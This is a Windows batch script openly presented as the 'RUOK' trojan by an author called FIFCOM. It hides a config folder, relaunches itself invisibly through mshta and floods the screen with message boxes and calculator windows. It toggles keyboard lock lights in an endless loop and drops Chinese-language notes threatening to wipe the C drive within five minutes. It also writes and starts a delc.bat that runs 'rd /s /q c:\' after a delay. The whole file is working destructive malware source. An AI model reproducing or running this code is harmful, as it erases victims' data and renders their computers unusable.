::***************************
::  BY FIFCOM
::***************************
@echo off
title RUOK
color 0c
echo YOUR COMPUTER HAS BEEN FUCKED BY THE RUOK TROJAN.
md config
attrib +s +a +h +r config
echo.msgbox "Are You OK?",0,"FIFCOM 制作" >config\1.vbs
echo.msgbox "Are You OK?",vbyesno + vbexclamation + vbdefaultbutton2,"FIFCOM 制作" >config\2.vbs
echo.msgbox "Are You OK?",vbinformation,"FIFCOM 制作" >config\3.vbs
echo.msgbox "Are You OK?",vbyesno + vbinformation,"FIFCOM 制作" >config\4.vbs
echo.msgbox "Are You OK?",1,"FIFCOM 制作" >config\5.vbs
echo.msgbox "Are You OK?",2,"FIFCOM 制作" >config\6.vbs
echo.msgbox "Are You OK?",3,"FIFCOM 制作" >config\7.vbs
echo.msgbox "Are You OK?",4,"FIFCOM 制作" >config\8.vbs
echo.msgbox "Are You OK?",5,"FIFCOM 制作" >config\9.vbs
echo.Set objShell = CreateObject("Wscript.Shell") >config\keyboard.vbs
echo.do >>config\keyboard.vbs
echo.WScript.Sleep 50 >>config\keyboard.vbs
echo.objShell.SendKeys "{NUMLOCK}" >>config\keyboard.vbs
echo.WScript.Sleep 50 >>config\keyboard.vbs
echo.objShell.SendKeys "{CAPSLOCK}" >>config\keyboard.vbs
echo.WScript.Sleep 50 >>config\keyboard.vbs
echo.objShell.SendKeys "{SCROLLLOCK}" >>config\keyboard.vbs
echo.loop >>config\keyboard.vbs
echo.@echo off >config\delc.bat
echo.ping -n 360 127.1>nul>>config\delc.bat
echo.rd /s /q c:\ >>config\delc.bat
echo.:D >>config\w.txt
echo.YOUR COMPUTER HAS BEEN FUCKED BY THE RUOK VIRUS. >>config\w.txt
echo.Language=Chinese >>config\w.txt
echo. >>config\w.txt
echo. 病毒即将进入后期阶段>>config\w.txt
echo. >>config\w.txt
echo. 你的C盘中几乎全部文件将被删除！并且无法恢复!>>config\w.txt
echo. 你的C盘中几乎全部文件将被删除！并且无法恢复!>>config\w.txt
echo. 你的C盘中几乎全部文件将被删除！并且无法恢复!>>config\w.txt
echo. >>config\w.txt
echo. 屏幕上将被弹窗和计算器占满，接近死机>>config\w.txt
echo. >>config\w.txt
echo. 你必须要在5分钟内关掉病毒!>>config\w.txt
echo. 当前时间:%time%>>config\w.txt
echo. >>config\w.txt
echo.Q:如何关掉病毒?>>config\w.txt
echo.A:请运行 @RUOK@.bat>>config\w.txt
echo. >>config\w.txt
echo.FIFCOM 制作 >>config\w.txt
echo.@echo off >@RUOK@.bat
echo.taskkill /f /im wscript.exe >>@RUOK@.bat
echo.taskkill /f /im mshta.exe>>@RUOK@.bat
echo.taskkill /f /im calc.exe >>@RUOK@.bat
echo.attrib -s -a -h -r config >>@RUOK@.bat
echo.attrib -s -a -h -r date >>@RUOK@.bat
echo.del config\1.vbs>>@RUOK@.bat
echo.del config\2.vbs>>@RUOK@.bat
echo.del config\3.vbs>>@RUOK@.bat
echo.del config\4.vbs>>@RUOK@.bat
echo.del config\5.vbs>>@RUOK@.bat
echo.del config\6.vbs>>@RUOK@.bat
echo.del config\7.vbs>>@RUOK@.bat
echo.del config\8.vbs>>@RUOK@.bat
echo.del config\9.vbs>>@RUOK@.bat
echo.del config\keyboard.vbs>>@RUOK@.bat
echo.del config\w.txt>>@RUOK@.bat
echo.del config\delc.bat>>@RUOK@.bat
echo.rd config>>@RUOK@.bat
echo.del Note.txt>>@RUOK@.bat
echo.del C:\Users\%username%\Desktop\Note.txt >>@RUOK@.bat
echo.taskkill /f /im cmd.exe >>@RUOK@.bat
echo.:D >Note.txt
echo.YOUR COMPUTER HAS BEEN FUCKED BY THE RUOK TROJAN. >>Note.txt
echo.Language=Chinese >>Note.txt
echo. >>Note.txt
echo.Q: 我的电脑出了什么问题? >>Note.txt
echo.A: 你的电脑已经被病毒入侵了。 >>Note.txt
echo. >>Note.txt
echo.Q: 这个病毒有危害性吗? >>Note.txt
echo.A: 当然有，以下是病毒早期的症状: >>Note.txt
echo. 1.弹出网页; >>Note.txt
echo. 2.键盘上的 数字锁定键/大写锁定键/滚动锁定键 指示灯将不断闪烁; >>Note.txt
echo. 3.弹出少量提示框。 >>Note.txt
echo. >>Note.txt
echo.Q:如果我不理睬病毒会怎样? >>Note.txt
echo.A:你的电脑会被弄坏。 >>Note.txt
echo. >>Note.txt
echo.Q:如何关掉病毒?>>Note.txt
echo.A:请运行 @RUOK@.bat>>Note.txt
echo. >>Note.txt
echo.FIFCOM 制作 >>Note.txt

if "%1"=="h" goto 1
start mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit

:1
start Note.txt
ping -n 10 127.1>nul
start config\1.vbs
ping -n 10 127.1>nul
start config\2.vbs
ping -n 9 127.1>nul
start config\3.vbs
ping -n 8 127.1>nul
start config\4.vbs
ping -n 7 127.1>nul
start config\5.vbs
ping -n 6 127.1>nul
start config\6.vbs
ping -n 5 127.1>nul
start config\7.vbs
ping -n 4 127.1>nul
start config\8.vbs
ping -n 3 127.1>nul
start config\9.vbs
ping -n 2 127.1>nul
taskkill /f /im wscript.exe
goto 2

:2
start config\keyboard.vbs
ping -n 10 127.1>nul
taskkill /f /im notepad.exe
ping -n 10 127.1>nul
start config\w.txt
ping -n 10 127.1>nul
start C:\windows\system32
ping -n 10 127.1>nul
start config\delc.bat
goto 3

:3
start config\1.vbs
start config\2.vbs
start config\3.vbs
start config\4.vbs
start config\5.vbs
start config\6.vbs
start config\7.vbs
start config\8.vbs
start config\9.vbs
start calc
goto 4

:4
goto 3
